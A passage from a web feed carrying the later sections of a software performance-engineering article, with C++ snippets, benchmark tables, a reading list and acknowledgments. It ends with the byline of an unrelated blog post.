<p>literal.cc</p>

<div>
<pre><code>ShapeUtil::ForEachIndex(
    result_shape, [&amp;](absl::Span&lt;const int64_t&gt; output_index) {
      for (int64_t i = 0, end = dimensions.size(); i &lt; end; ++i) {
        scratch_source_index[i] = output_index[dimensions[i]];
      }
      int64_t dest_index = IndexUtil::MultidimensionalIndexToLinearIndex(
          result_shape, output_index);
      int64_t source_index = IndexUtil::MultidimensionalIndexToLinearIndex(
          shape(), scratch_source_index);
      memcpy(dest_data + primitive_size * dest_index,
             source_data + primitive_size * source_index, primitive_size);
      return true;
    });
</code></pre>
</div>

<div>
<pre><code>ShapeUtil::ForEachIndexNoStatus(
    result_shape, [&amp;](absl::Span&lt;const int64_t&gt; output_index) {
      // Compute dest_index
      int64_t dest_index = IndexUtil::MultidimensionalIndexToLinearIndex(
          result_shape, result_minor_to_major, output_index);

      // Compute source_index
      int64_t source_index;
      for (int64_t i = 0, end = dimensions.size(); i &lt; end; ++i) {
        scratch_source_array[i] = output_index[dimensions[i]];
      }
      if (src_shape_dims == 1) {
        // Fast path for this case
        source_index = scratch_source_array[0];
        DCHECK_EQ(source_index,
                  IndexUtil::MultidimensionalIndexToLinearIndex(
                      src_shape, src_minor_to_major, scratch_source_span));
      } else {
        source_index = IndexUtil::MultidimensionalIndexToLinearIndex(
            src_shape, src_minor_to_major, scratch_source_span);
      }
      // Move one element from source_index in source to dest_index in dest
      memcpy(dest_data + PRIMITIVE_SIZE * dest_index,
             source_data + PRIMITIVE_SIZE * source_index, PRIMITIVE_SIZE);
      return true;
    });
</code></pre>
</div>


</details>

<details>
<summary><p>In TF_CHECK_OK, avoid creating Ok object in order to test
for ok().</p>
</summary>

<p>status.h</p>

<div>
<pre><code>#define TF_CHECK_OK(val) CHECK_EQ(::tensorflow::Status::OK(), (val))
#define TF_QCHECK_OK(val) QCHECK_EQ(::tensorflow::Status::OK(), (val))
</code></pre>
</div>

<div>
<pre><code>extern tensorflow::string* TfCheckOpHelperOutOfLine(
    const ::tensorflow::Status&amp; v, const char* msg);
inline tensorflow::string* TfCheckOpHelper(::tensorflow::Status v,
                                           const char* msg) {
  if (v.ok()) return nullptr;
  return TfCheckOpHelperOutOfLine(v, msg);
}
#define TF_CHECK_OK(val)                                           \
  while (tensorflow::string* _result = TfCheckOpHelper(val, #val)) \
  LOG(FATAL) &lt;&lt; *(_result)
#define TF_QCHECK_OK(val)                                          \
  while (tensorflow::string* _result = TfCheckOpHelper(val, #val)) \
  LOG(QFATAL) &lt;&lt; *(_result)
</code></pre>
</div>


</details>

<details>
<summary><p>Remove StatusOr from the hot path of remote procedure
calls (RPCs).</p>
</summary>

<p>Removal of StatusOr from a hot path eliminated a 14% CPU regression in RPC
benchmarks caused by an earlier change.</p>
<p>privacy_context.h</p>

<div>
<pre><code>absl::StatusOr&lt;privacy::context::PrivacyContext&gt; GetRawPrivacyContext(
    const CensusHandle&amp; h);
</code></pre>
</div>

<p>privacy_context_statusfree.h</p>

<div>
<pre><code>enum class Result {
  kSuccess,
  kNoRootScopedData,
  kNoPrivacyContext,
  kNoDDTContext,
  kDeclassified,
  kNoPrequestContext
};
...
Result GetRawPrivacyContext(const CensusHandle&amp; h,
                            PrivacyContext* privacy_context);
</code></pre>
</div>


</details>

<h2 id="bulk-operations">Bulk operations</h2>

<p>If possible, handle many items at once rather than just one at a time.</p>

<details>
<summary><p>absl::flat_hash_map compares one hash byte per key from a
group of keys using a single SIMD instruction.</p>
</summary>

<p>See <a href="https://abseil.io/about/design/swisstables">Swiss Table Design Notes</a> and
related <a href="https://www.youtube.com/watch?v=ncHmEUmJZf4">CppCon 2017</a> and
<a href="https://www.youtube.com/watch?v=JZE3_0qvrMg">CppCon 2019</a> talks by Matt
Kulukundis.</p>
<p>raw_hash_set.h</p>

<div>
<pre><code>// Returns a bitmask representing the positions of slots that match hash.
BitMask&lt;uint32_t&gt; Match(h2_t hash) const {
  auto ctrl = _mm_loadu_si128(reinterpret_cast&lt;const __m128i*&gt;(pos));
  auto match = _mm_set1_epi8(hash);
  return BitMask&lt;uint32_t&gt;(_mm_movemask_epi8(_mm_cmpeq_epi8(match, ctrl)));
}
</code></pre>
</div>


</details>

<details>
<summary><p>Do single operations to deal with many bytes and fix
things up, rather than checking every byte what to do.</p>
</summary>

<p>ordered-code.cc</p>

<div>
<pre><code>int len = 0;
while (val &gt; 0) {
  len++;
  buf[9 - len] = (val &amp; 0xff);
  val &gt;&gt;= 8;
}
buf[9 - len - 1] = (unsigned char)len;
len++;
FastStringAppend(dest, reinterpret_cast&lt;const char*&gt;(buf + 9 - len), len);
</code></pre>
</div>

<div>
<pre><code>BigEndian::Store(val, buf + 1);  // buf[0] may be needed for length
const unsigned int length = OrderedNumLength(val);
char* start = buf + 9 - length - 1;
*start = length;
AppendUpto9(dest, start, length + 1);
</code></pre>
</div>


</details>

<details>
<summary><p>Improve Reed-Solomon processing speed by handling
multiple interleaved input buffers more efficiently in chunks.</p>
</summary>

<pre><code>Run on (12 X 3501 MHz CPUs); 2016-09-27T16:04:55.065995192-04:00
CPU: Intel Haswell with HyperThreading (6 cores) dL1:32KB dL2:256KB dL3:15MB
Benchmark                          Base (ns)  New (ns) Improvement
------------------------------------------------------------------
BM_OneOutput/3/2                      466867    351818    +24.6%
BM_OneOutput/4/2                      563130    474756    +15.7%
BM_OneOutput/5/3                      815393    688820    +15.5%
BM_OneOutput/6/3                      897246    780539    +13.0%
BM_OneOutput/8/4                     1270489   1137149    +10.5%
BM_AllOutputs/3/2                     848772    642942    +24.3%
BM_AllOutputs/4/2                    1067647    638139    +40.2%
BM_AllOutputs/5/3                    1739135   1151369    +33.8%
BM_AllOutputs/6/3                    2045817   1456744    +28.8%
BM_AllOutputs/8/4                    3012958   2484937    +17.5%
BM_AllOutputsSetUpOnce/3/2            717310    493371    +31.2%
BM_AllOutputsSetUpOnce/4/2            833866    600060    +28.0%
BM_AllOutputsSetUpOnce/5/3           1537870   1137357    +26.0%
BM_AllOutputsSetUpOnce/6/3           1802353   1398600    +22.4%
BM_AllOutputsSetUpOnce/8/4           3166930   2455973    +22.4%
</code></pre>

</details>

<details>
<summary><p>Decode four integers at a time (circa 2004).</p>
</summary>

<p>Introduced a
<a href="https://static.googleusercontent.com/media/research.google.com/en//people/jeff/WSDM09-keynote.pdf">GroupVarInt format</a>
that encodes/decodes groups of 4 variable-length integers at a time in 5-17
bytes, rather than one integer at a time. Decoding one group of 4 integers in
the new format takes ~1/3rd the time of decoding 4 individually varint-encoded
integers.</p>
<p>groupvarint.cc</p>

<div>
<pre><code>const char* DecodeGroupVar(const char* p, int N, uint32* dest) {
  assert(groupvar_initialized);
  assert(N % 4 == 0);
  while (N) {
    uint8 tag = *p;
    p++;

    uint8* lenptr = &amp;groupvar_table[tag].length[0];

#define GET_NEXT                                        \
    do {                                                \
      uint8 len = *lenptr;                              \
      *dest = UNALIGNED_LOAD32(p) &amp; groupvar_mask[len]; \
      dest++;                                           \
      p += len;                                         \
      lenptr++;                                         \
    } while (0)
    GET_NEXT;
    GET_NEXT;
    GET_NEXT;
    GET_NEXT;
#undef GET_NEXT

    N -= 4;
  }
  return p;
}
</code></pre>
</div>


</details>

<details>
<summary><p>Encode groups of 4 k-bit numbers at a time.</p>
</summary>

<p>Added KBitStreamEncoder and KBitStreamDecoder classes to encode/decode 4 k-bit
numbers at a time into a bit stream. Since K is known at compile time, the
encoding and decoding can be quite efficient. E.g., since four numbers are
encoded at a time, the code can assume that the stream is always byte-aligned
(for even k), or nibble-aligned (for odd k).</p>

</details>

<h2 id="cls-that-demonstrate-multiple-techniques">CLs that demonstrate multiple techniques</h2>

<p>Sometimes a single CL contains a number of performance-improving changes that
use many of the preceding techniques. Looking at the kinds of changes in these
CLs is sometimes a good way to get in the mindset of making general changes to
speed up the performance of some part of a system after that has been identified
as a bottleneck.</p>

<details>
<summary><p>Speed up GPU memory allocator by ~40%.</p>
</summary>

<p>36-48% speedup in allocation/deallocation speed for GPUBFCAllocator:</p>
<ol>
<li>
<p>Identify chunks by a handle number, rather than by a pointer to a Chunk.
Chunk data structures are now allocated in a <code>vector&lt;Chunk&gt;</code>, and a handle
is an index into this vector to refer to a particular chunk. This allows the
next and prev pointers in Chunk to be ChunkHandle (4 bytes), rather than
<code>Chunk*</code> (8 bytes).</p>
</li>
<li>
<p>When a Chunk object is no longer in use, we maintain a free list of Chunk
objects, whose head is designated by ChunkHandle <code>free_chunks_list_</code>, and
with the <code>Chunk-&gt;next</code> pointing to the next free list entry. Together with
(1), this allows us to avoid heap allocation/deallocation of Chunk objects
in the allocator, except (rarely) when the <code>vector&lt;Chunk&gt;</code> grows. It also
makes all the memory for Chunk objects contiguous.</p>
</li>
<li>
<p>Rather than having the bins_ data structure be a std::set and using
lower_bound to locate the appropriate bin given a byte_size, we instead have
an array of bins, indexed by a function that is log₂(byte_size/256). This
allows the bin to be located with a few bit operations, rather than a binary
search tree lookup. It also allows us to allocate the storage for all the
Bin data structures in a contiguous array, rather than in many different
cache lines. This reduces the number of cache lines that must be moved
around between cores when multiple threads are doing allocations.</p>
</li>
<li>
<p>Added fast path to GPUBFCAllocator::AllocateRaw that first tries to allocate
memory without involving the retry_helper_. If an initial attempt fails
(returns nullptr), then we go through the retry_helper_, but normally we can
avoid several levels of procedure calls as well as the
allocation/deallocation of a std::function with several arguments.</p>
</li>
<li>
<p>Commented out most of the VLOG calls. These can be reenabled selectively
when needed for debugging purposes by uncommenting and recompiling.</p>
</li>
</ol>
<p>Added multi-threaded benchmark to test allocation under contention.</p>
<p>Speeds up ptb_word_lm on my desktop machine with a Titan X card from 8036 words
per second to 8272 words per second (+2.9%).</p>
<pre><code>Run on (40 X 2801 MHz CPUs); 2016/02/16-15:12:49
CPU: Intel Ivybridge with HyperThreading (20 cores) dL1:32KB dL2:256KB dL3:25MB
Benchmark                          Base (ns)  New (ns) Improvement
------------------------------------------------------------------
BM_Allocation                            347       184    +47.0%
BM_AllocationThreaded/1                  351       181    +48.4%
BM_AllocationThreaded/4                 2470      1975    +20.0%
BM_AllocationThreaded/16               11846      9507    +19.7%
BM_AllocationDelayed/1                   392       199    +49.2%
BM_AllocationDelayed/10                  285       169    +40.7%
BM_AllocationDelayed/100                 245       149    +39.2%
BM_AllocationDelayed/1000                238       151    +36.6%
</code></pre>

</details>

<details>
<summary><p>Speed up Pathways throughput by ~20% via a set of
miscellaneous changes.</p>
</summary>

<ul>
<li>
<p>Unified a bunch of special fast descriptor parsing functions into a single
ParsedDescriptor class and use this class in more places to avoid expensive
full parse calls.</p>
</li>
<li>
<p>Change several protocol buffer fields from string to bytes (avoids
unnecessary utf-8 checks and associated error handling code).</p>
</li>
<li>
<p>DescriptorProto.inlined_contents is now a string, not a Cord (it is expected
to be used only for small-ish tensors). This necessitated the addition of a
bunch of copying helpers in tensor_util.cc (need to now support both strings
and Cords).</p>
</li>
<li>
<p>Use flat_hash_map instead of std::unordered_map in a few places.</p>
</li>
<li>
<p>Added MemoryManager::LookupMany for use by Stack op instead of calling
Lookup per batch element. This change reduces setup overhead like locking.</p>
</li>
<li>
<p>Removed some unnecessary string creation in TransferDispatchOp.</p>
</li>
<li>
<p>Performance results for transferring a batch of 1000 1KB tensors from one
component to another in the same process:</p>
</li>
</ul>
<pre><code>Before: 227.01 steps/sec
After:  272.52 steps/sec (+20% throughput)
</code></pre>

</details>

<details>
<summary><p>~15% XLA compiler performance improvement through a
series of changes.</p>
</summary>

<p>Some changes to speed up XLA compilation:</p>
<ol>
<li>
<p>In SortComputationsByContent, return false if a == b in comparison function,
to avoid serializing and fingerprinting long computation strings.</p>
</li>
<li>
<p>Turn CHECK into DCHECK to avoid touching an extra cache line in
HloComputation::ComputeInstructionPostOrder</p>
</li>
<li>
<p>Avoid making an expensive copy of the front instruction in
CoreSequencer::IsVectorSyncHoldSatisfied().</p>
</li>
<li>
<p>Rework 2-argument HloComputation::ToString and HloComputation::ToCord
routines to do the bulk of the work in terms of appending to std::string,
rather than appending to a Cord.</p>
</li>
<li>
<p>Change PerformanceCounterSet::Increment to just do a single hash table
lookup rather than two.</p>
</li>
<li>
<p>Streamline Scoreboard::Update code</p>
</li>
</ol>
<p>Overall speedup of 14% in XLA compilation time for one important
model.</p>

</details>

<details>
<summary><p>Speed up low level logging in Google Meet application
code.</p>
</summary>

<p>Speed up ScopedLogId, which is on the critical path for each packet.</p>
<ul>
<li>Removed the <code>LOG_EVERY_N(ERROR, ...)</code> messages that seemed to be there only
to see if invariants were violated.</li>
<li>Inlined the PushLogId and PopLogid() routines (since without the
<code>LOG_EVERY_N_SECONDS(ERROR, ...)</code> statements, they are now small enough to
inline.</li>
<li>Switched to using a fixed array of size 4 and an 'int size' variable instead
of an <code>InlinedVector&lt;...&gt;</code> for maintaining the thread local state. Since we
never were growing beyond size 4 anyway, the InlinedVector's functionality
was more general than needed.</li>
</ul>
<pre><code>Base: Baseline plus the code in scoped_logid_test.cc to add the benchmark
New: This changelist

CPU: Intel Ivybridge with HyperThreading (20 cores) dL1:32KB dL2:256KB dL3:25MB
Benchmark                                      Base (ns)    New (ns) Improvement
----------------------------------------------------------------------------
BM_ScopedLogId/threads:1                               8           4    +52.6%
BM_ScopedLogId/threads:2                               8           4    +51.9%
BM_ScopedLogId/threads:4                               8           4    +52.9%
BM_ScopedLogId/threads:8                               8           4    +52.1%
BM_ScopedLogId/threads:16                             11           6    +44.0%

</code></pre>

</details>

<details>
<summary><p>Reduce XLA compilation time by ~31% by improving Shape
handling.</p>
</summary>

<p>Several changes to improve XLA compiler performance:</p>
<ol>
<li>
<p>Improved performance of ShapeUtil::ForEachIndex... iteration in a few ways:</p>
<ul>
<li>
<p>In ShapeUtil::ForEachState, save just pointers to the arrays represented
by the spans, rather than the full span objects.</p>
</li>
<li>
<p>Pre-form a ShapeUtil::ForEachState::indexes_span pointing at the
ShapeUtil::ForEachState::indexes vector, rather than constructing this
span from the vector on every loop iteration.</p>
</li>
<li>
<p>Save a ShapeUtil::ForEachState::indexes_ptr pointer to the backing store
of the ShapeUtil::ForEachState::indexes vector, allowing simple array
operations in ShapeUtil::ForEachState::IncrementDim(), rather than more
expensive vector::operator[] operations.</p>
</li>
<li>
<p>Save a ShapeUtil::ForEachState::minor_to_major array pointer initialized
in the constructor by calling shape.layout().minor_to_major().data()
rather than calling LayoutUtil::Minor(...) for each dimension for each
iteration.</p>
</li>
<li>
<p>Inlined the ShapeUtil::ForEachState constructor and the
ShapeUtil::ForEachState::IncrementDim() routines</p>
</li>
</ul>
</li>
<li>
<p>Improved the performance of ShapeUtil::ForEachIndex iteration for call sites
that don't need the functionality of returning a Status in the passed in
function. Did this by introducing ShapeUtil::ForEachIndexNoStatus variants,
which accept a ForEachVisitorFunctionNoStatus (which returns a plain bool).
This is faster than the ShapeUtil::ForEachIndex routines, which accept a
ForEachVisitorFunction (which returns a <code>StatusOr&lt;bool&gt;</code>, which requires an
expensive <code>StatusOr&lt;bool&gt;</code> destructor call per element that we iterate
over).</p>
<ul>
<li>Used this variant of ShapeUtil::ForEachIndexNoStatus in
LiteralBase::Broadcast and GenerateReduceOutputElement.</li>
</ul>
</li>
<li>
<p>Improved performance of LiteralBase::Broadcast in several ways:</p>
<ul>
<li>
<p>Introduced templated BroadcastHelper routine in literal.cc that is
specialized for different primitive byte sizes (without this,
primitive_size was a runtime variable and so the compiler couldn't do a
very good job of optimizing the memcpy that occurred per element, and
would invoke the general memcpy path that assumes the byte count is
fairly large, even though in our case it is a tiny power of 2 (typically
1, 2, 4, or 8)).</p>
</li>
<li>
<p>Avoided all but one of ~(5 + num_dimensions + num_result_elements)
virtual calls per Broadcast call by making a single call to 'shape()' at
the beginning of the LiteralBase::Broadcast routine. The innocuous
looking 'shape()' calls that were sprinkled throughout end up boiling
down to "root_piece().subshape()", where subshape() is a virtual
function.</p>
</li>
<li>
<p>In the BroadcastHelper routine, Special-cased the source dimensions
being one and avoided a call to
IndexUtil::MultiDimensionalIndexToLinearIndex for this case.</p>
</li>
<li>
<p>In BroadcastHelper, used a scratch_source_array pointer variable that
points into the backing store of the scratch_source_index vector, and
used that directly to avoid vector::operator[] operations inside the
per-element code. Also pre-computed a scratch_source_span that points to
the scratch_source_index vector outside the per-element loop in
BroadcastHelper, to avoid constructing a span from the vector on each
element.</p>
</li>
<li>
<p>Introduced new three-argument variant of
IndexUtil::MultiDimensionalIndexToLinearIndex where the caller passes in
the minor_to_major span associated with the shape argument. Used this in
BroadcastHelper to compute this for the src and dst shapes once per
Broadcast, rather than once per element copied.</p>
</li>
</ul>
</li>
<li>
<p>In ShardingPropagation::GetShardingFromUser, for the HloOpcode::kTuple case,
only call user.sharding().GetSubSharding(...) if we have found the operand
to be of interest. Avoiding calling it eagerly reduces CPU time in this
routine for one lengthy compilation from 43.7s to 2.0s.</p>
</li>
<li>
<p>Added benchmarks for ShapeUtil::ForEachIndex and Literal::Broadcast and for
the new ShapeUtil::ForEachIndexNoStatus.</p>
</li>
</ol>
<pre><code>Base is with the benchmark additions of
BM_ForEachIndex and BM_BroadcastVectorToMatrix (and BUILD file change to add
benchmark dependency), but no other changes.

New is this cl

Run on (72 X 1357.56 MHz CPU s) CPU Caches: L1 Data 32 KiB (x36)
L1 Instruction 32 KiB (x36) L2 Unified 1024 KiB (x36) L3 Unified 25344 KiB (x2)

Benchmark                                      Base (ns)    New (ns) Improvement
----------------------------------------------------------------------------
BM_MakeShape                                       18.40       18.90     -2.7%
BM_MakeValidatedShape                              35.80       35.60     +0.6%
BM_ForEachIndex/0                                  57.80       55.80     +3.5%
BM_ForEachIndex/1                                  90.90       85.50     +5.9%
BM_ForEachIndex/2                               1973606     1642197     +16.8%
</code></pre>
<p>The newly added ForEachIndexNoStatus is considerably faster than the
ForEachIndex variant (it only exists in this new cl, but the benchmark work that
is done by BM_ForEachIndexNoStatus/NUM is comparable to the BM_ForEachIndex/NUM
results above).</p>
<pre><code>Benchmark                                      Base (ns)    New (ns) Improvement
----------------------------------------------------------------------------
BM_ForEachIndexNoStatus/0                             0        46.90    ----
BM_ForEachIndexNoStatus/1                             0        65.60    ----
BM_ForEachIndexNoStatus/2                             0     1001277     ----
</code></pre>
<p>Broadcast performance improves by ~58%.</p>
<pre><code>Benchmark                                      Base (ns)    New (ns) Improvement
----------------------------------------------------------------------------
BM_BroadcastVectorToMatrix/16/16                   5556        2374     +57.3%
BM_BroadcastVectorToMatrix/16/1024               319510      131075     +59.0%
BM_BroadcastVectorToMatrix/1024/1024           20216949     8408188     +58.4%
</code></pre>
<p>Macro results from doing ahead-of-time compilation of a large language model
(program does more than just the XLA compilation, but spends a bit less than
half its time in XLA-related code):</p>
<p>Baseline program overall: 573 seconds With this cl program overall: 465 seconds
(+19% improvement)</p>
<p>Time spent in compiling the two largest XLA programs in running this program:</p>
<p>Baseline: 141s + 143s = 284s With this CL: 99s + 95s = 194s (+31% improvement)</p>

</details>

<details>
<summary><p>Reduce compilation time for large programs by ~22% in
Plaque (a distributed execution framework).</p>
</summary>

<p>Small tweaks to speed up compilation by ~22%.</p>
<ol>
<li>Speed up detection of whether or not two nodes share a common source.
Previously, we would get the sources for each node in sorted order and then
do a sorted intersection. We now place the sources for one node in a
hash-table and then iterate over the other node's sources checking the
hash-table.</li>
<li>Reuse the same scratch hash-table in step 1.</li>
<li>When generating compiled proto, keep a single btree keyed by <code>pair&lt;package, opname&gt;</code> instead of a btree of btrees.</li>
<li>Store pointer to opdef in the preceding btree instead of copying the opdef
into the btree.</li>
</ol>
<p>Measurement of speed on large programs (~45K ops):</p>
<pre><code>name             old time/op  new time/op  delta
BM_CompileLarge   28.5s ± 2%   22.4s ± 2%  -21.61%  (p=0.008 n=5+5)
</code></pre>

</details>

<details>
<summary><p>MapReduce improvements (~2X speedup for wordcount
benchmark).</p>
</summary>

<p>Mapreduce speedups:</p>
<ol>
<li>
<p>The combiner data structures for the SafeCombinerMapOutput class have been
changed. Rather than using a <code>hash_multimap&lt;SafeCombinerKey, StringPiece&gt;</code>,
which had a hash table entry for each unique key/value inserted in the
table, we instead use a <code>hash_map&lt;SafeCombinerKey, ValuePtr*&gt;</code> (where
ValuePtr is a linked list of values and repetition counts). This helps in
three ways:</p>
<ul>
<li>
<p>It significantly reduces memory usage, since we only use
"sizeof(ValuePtr) + value_len" bytes for each value, rather than
"sizeof(SafeCombinerKey) + sizeof(StringPiece) + value_len + new hash
table entry overhead" for each value. This means that we flush the
reducer buffer less often.</p>
</li>
<li>
<p>It's significantly faster, since we avoid extra hash table entries when
we're inserting a new value for a key that already exists in the table
(and instead we just hook the value into the linked list of values for
that key).</p>
</li>
<li>
<p>Since we associate a repetition count with each value in the linked
list, we can represent this sequence:</p>
<pre><code>Output(key, "1");
Output(key, "1");
Output(key, "1");
Output(key, "1");
Output(key, "1");
</code></pre>
</li>
</ul>
<p>as a single entry in the linked list for "key" with a repetition count of 5.
Internally we yield "1" five times to the user-level combining function. (A
similar trick could be applied on the reduce side, perhaps).</p>
</li>
<li>
<p>(Minor) Added a test for "nshards == 1" to the default
MapReductionBase::KeyFingerprintSharding function that avoids fingerprinting
the key entirely if we are just using 1 reduce shard (since we can just
return 0 directly in that case without examining the key).</p>
</li>
<li>
<p>Turned some VLOG(3) statements into DVLOG(3) in the code path that is called
for each key/value added to the combiner.</p>
</li>
</ol>
<p>Reduces time for one wordcount benchmark from 12.56s to 6.55s.</p>

</details>

<details>
<summary><p>Rework the alarm handling code in the SelectServer to
significantly improve its performance (adding+removing an alarm from 771 ns to
271 ns).</p>
</summary>

<p>Reworked the alarm handling code in the SelectServer to significantly improve
its performance.</p>
<p>Changes:</p>
<ol>
<li>
<p>Switched to using <code>AdjustablePriorityQueue&lt;Alarm&gt;</code> instead of a a
<code>set&lt;Alarm*&gt;</code> for the <code>AlarmQueue</code>. This significantly speeds up alarm
handling, reducing the time taken to add and remove an alarm from 771
nanoseconds to 281 nanoseconds. This change avoids an
allocation/deallocation per alarm setup (for the red-black tree node in the
STL set object), and also gives much better cache locality (since the
AdjustablePriorityQueue is a heap implemented in a vector, rather than a
red-black tree), there are fewer cache lines touched when manipulating the
<code>AlarmQueue</code> on every trip through the selectserver loop.</p>
</li>
<li>
<p>Converted AlarmList in Alarmer from a hash_map to a dense_hash_map to avoid
another allocation/deallocation per alarm addition/deletion (this also
improves cache locality when adding/removing alarms).</p>
</li>
<li>
<p>Removed the <code>num_alarms_stat_</code> and <code>num_closures_stat_</code>
MinuteTenMinuteHourStat objects, and the corresponding exported variables.
Although monitoring these seems nice, in practice they add significant
overhead to critical networking code. If I had left these variables in as
Atomic32 variables instead of MinuteTenMinuteHourStat, they would have still
increased the cost of adding and removing alarms from 281 nanoseconds to 340
nanoseconds.</p>
</li>
</ol>
<p>Benchmark results</p>
<pre><code>Benchmark                      Time(ns)  CPU(ns) Iterations
-----------------------------------------------------------
BM_AddAlarm/1                       902      771     777777
</code></pre>
<p>With this change</p>
<pre><code>Benchmark                      Time(ns)  CPU(ns) Iterations
-----------------------------------------------------------
BM_AddAlarm/1                       324      281    2239999
</code></pre>

</details>

<details>
<summary><p>3.3X performance in index serving speed!</p>
</summary>

<p>We found a number of performance issues when planning a switch from on-disk to
in-memory index serving in 2001. This change fixed many of these problems and
took us from 150 to over 500 in-memory queries per second (for a 2 GB in-memory
index on dual processor Pentium III machine).</p>
<ul>
<li>Lots of performance improvements to index block decoding speed (8.9 MB/s to
13.1 MB/s for a microbenchmark).</li>
<li>We now checksum the block during decoding. This allows us to implement all
of our getsymbol operations to be done without any bounds checking.</li>
<li>We have grungy macros that hold the various fields of a BitDecoder in local
variables over entire loops, and then store them back at the end of the
loops.</li>
<li>We use inline assembly to get at the 'bsf' instruction on Intel chips for
getUnary (finds index of first 1 bit in a word)</li>
<li>When decoding values into a vector, we resize the vector outside of the loop
and just walk a pointer along the vector, rather than doing a bounds-checked
access to store every value.</li>
<li>During docid decoding, we keep the docids in local docid space, to avoid
multiplying by num_shards_. Only when we need the actual docid value do we
multiply by num_shards_ and add my_shard_.</li>
<li>The IndexBlockDecoder now exports an interface 'AdvanceToDocid' that returns
the index of the first docid ≥ "d". This permits the scanning to be done
in terms of local docids, rather than forcing the conversion of each local
docid to a global docid when the client calls GetDocid(index) for every
index in the block.</li>
<li>Decoding of position data for documents is now done on demand, rather than
being done eagerly for the entire block when the client asked for position
data for any document within the block.</li>
<li>If the index block being decoded ends within 4 bytes of a page boundary, we
copy it to a local buffer. This allows us to always load our bit decoding
buffer via a 4-byte load, without having to worry about seg faults if we run
off the end of a mmapped page.</li>
<li>We only initialize the first nterms_ elements of various scoring data
structures, rather than initializing all MAX_TERMS of them (in some cases,
we were unnecessarily memsetting 20K to 100K of data per document scored).</li>
<li>Avoid round_to_int and subsequent computation on intermediate scoring values
when the value being computed is 0 (the subsequent computation was just
writing '0' over the 0 that we had memset in these cases, and this was the
most common case).</li>
<li>Made a bounds check on scoring data structures into a debug-mode assertion.</li>
</ul>

</details>

<h2 id="further-reading">Further reading</h2>

<p>In no particular order, a list of performance related books and articles that
the authors have found helpful:</p>

<ul>
  <li><a href="https://www.agner.org/optimize/optimizing_cpp.pdf">Optimizing software in C++</a>
by Agner Fog. Describes many useful low-level techniques for improving
performance.</li>
  <li><a href="https://www.oreilly.com/library/view/understanding-software-dynamics/9780137589692/">Understanding Software Dynamics</a>
by Richard L. Sites. Covers expert methods and advanced tools for diagnosing
and fixing performance problems.</li>
  <li><a href="https://abseil.io/fast/">Performance tips of the week</a> - a collection of
useful tips.</li>
  <li><a href="https://travisdowns.github.io/">Performance Matters</a> - a collection of
articles about performance.</li>
  <li><a href="https://lemire.me/blog/">Daniel Lemire’s blog</a> - high performance
implementations of interesting algorithms.</li>
  <li><a href="https://www.youtube.com/watch?v=modXC5IWTJI">Building Software Systems at Google and Lessons Learned</a> -
a video that describes system performance issues encountered at Google over
a decade.</li>
  <li><a href="https://books.google.com/books/about/Programming_Pearls.html?id=kse_7qbWbjsC">Programming Pearls</a>
and
<a href="https://books.google.com/books/about/More_Programming_Pearls.html?id=a2AZAQAAIAAJ">More Programming Pearls: Confessions of a Coder</a>
by Jon Bentley. Essays on starting with algorithms and ending up with simple
and efficient implementations.</li>
  <li><a href="https://en.wikipedia.org/wiki/Hacker%27s_Delight">Hacker’s Delight</a> by
Henry S. Warren. Bit-level and arithmetic algorithms for solving some common
problems.</li>
  <li><a href="https://books.google.com/books/about/Computer_Architecture.html?id=cM8mDwAAQBAJ">Computer Architecture: A Quantitative Approach</a>
by John L. Hennessy and David A. Patterson - Covers many aspects of computer
architecture, including one that performance-minded software developers
should be aware of like caches, branch predictors, TLBs, etc.</li>
</ul>

<h2 id="suggested-citation">Suggested citation</h2>

<p>If you want to cite this document, we suggest:</p>

<div><pre><code>Jeffrey Dean &amp; Sanjay Ghemawat, Performance Hints, 2025, https://abseil.io/fast/hints.html
</code></pre></div>

<p>Or in BibTeX:</p>

<div><pre><code><span>@misc</span><span>{</span><span>DeanGhemawatPerformance2025</span><span>,</span>
  <span>author</span> <span>=</span> <span>{Dean, Jeffrey and Ghemawat, Sanjay}</span><span>,</span>
  <span>title</span> <span>=</span> <span>{Performance Hints}</span><span>,</span>
  <span>year</span> <span>=</span> <span>{2025}</span><span>,</span>
  <span>howpublished</span> <span>=</span> <span>{\url{https://abseil.io/fast/hints.html}}</span><span>,</span>
<span>}</span>
</code></pre></div>

<h2 id="acknowledgments">Acknowledgments</h2>

<p>Many colleagues have provided helpful feedback on this document, including:</p>

<ul>
  <li>Adrian Ulrich</li>
  <li>Alexander Kuzmin</li>
  <li>Alexei Bendebury</li>
  <li>Alexey Alexandrov</li>
  <li>Amer Diwan</li>
  <li>Austin Sims</li>
  <li>Benoit Boissinot</li>
  <li>Brooks Moses</li>
  <li>Chris Kennelly</li>
  <li>Chris Ruemmler</li>
  <li>Danila Kutenin</li>
  <li>Darryl Gove</li>
  <li>David Majnemer</li>
  <li>Dmitry Vyukov</li>
  <li>Emanuel Taropa</li>
  <li>Felix Broberg</li>
  <li>Francis Birck Moreira</li>
  <li>Gideon Glass</li>
  <li>Henrik Stewenius</li>
  <li>Jeremy Dorfman</li>
  <li>John Dethridge</li>
  <li>Kurt Kluever</li>
  <li>Kyle Konrad</li>
  <li>Lucas Pereira</li>
  <li>Marc Eaddy</li>
  <li>Michael Marty</li>
  <li>Michael Whittaker</li>
  <li>Mircea Trofin</li>
  <li>Misha Brukman</li>
  <li>Nicolas Hillegeer</li>
  <li>Ranjit Mathew</li>
  <li>Rasmus Larsen</li>
  <li>Soheil Hassas Yeganeh</li>
  <li>Srdjan Petrovic</li>
  <li>Steinar H. Gunderson</li>
  <li>Stergios Stergiou</li>
  <li>Steven Timotius</li>
  <li>Sylvain Vignaud</li>
  <li>Thomas Etter</li>
  <li>Thomas Köppe</li>
  <li>Tim Chestnutt</li>
  <li>Todd Lipcon</li>
  <li>Vance Lankhaar</li>
  <li>Victor Costan</li>
  <li>Yao Zuo</li>
  <li>Zhou Fang</li>
  <li>Zuguang Yang</li>
</ul>


      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Prepare for That Stupid World (166 pts)]]></title>
            <link>https://ploum.net/2025-12-19-prepare-for-that-world.html</link>
            <guid>46328109</guid>
            <pubDate>Fri, 19 Dec 2025 17:01:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ploum.net/2025-12-19-prepare-for-that-world.html">https://ploum.net/2025-12-19-prepare-for-that-world.html</a>, See on <a href="https://news.ycombinator.com/item?id=46328109">Hacker News</a></p>
<div id="readability-page-1" class="page"><article>


<p>by <a href="https://fr.wikipedia.org/wiki/Ploum">Ploum</a> on 2025-12-19</p>
